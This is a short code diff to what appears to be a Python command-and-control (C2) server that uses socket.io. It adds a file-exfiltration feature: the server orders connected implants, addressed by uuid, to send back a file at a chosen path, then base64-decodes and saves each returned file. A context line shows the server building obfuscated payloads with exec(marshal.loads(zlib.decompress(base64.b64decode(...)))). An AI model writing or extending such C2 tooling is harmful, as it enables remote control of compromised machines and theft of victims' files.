@@ -23,6 +23,7 @@ class C2:
         self.sio.on('disconnect', self.on_disconect)
         self.sio.on('command', self.send_command)
         self.sio.on('result', self.get_result)
+        self.sio.on('download_file_return', self.save_file)
 
 
     def on_connect(self, sid, data):
@@ -213,6 +214,18 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         
 
     
+    def download_file(self, data):
+        file_path = data['file_path']
+        
+        for uuid in data['uuids']:
+            self.sio.emit("download_file", {'uuid': uuid, 'file_path': file_path})
 
+    
+    def save_file(self, sid, data):
 
+        if not os.path.isdir('files_saved'):
+            os.makedirs('files_saved')
+
+        with open(f"{data['uuid']}_{data['file_name']}", 'w') as f:
+            f.writelines(base64.b64decode(data['file']))
 
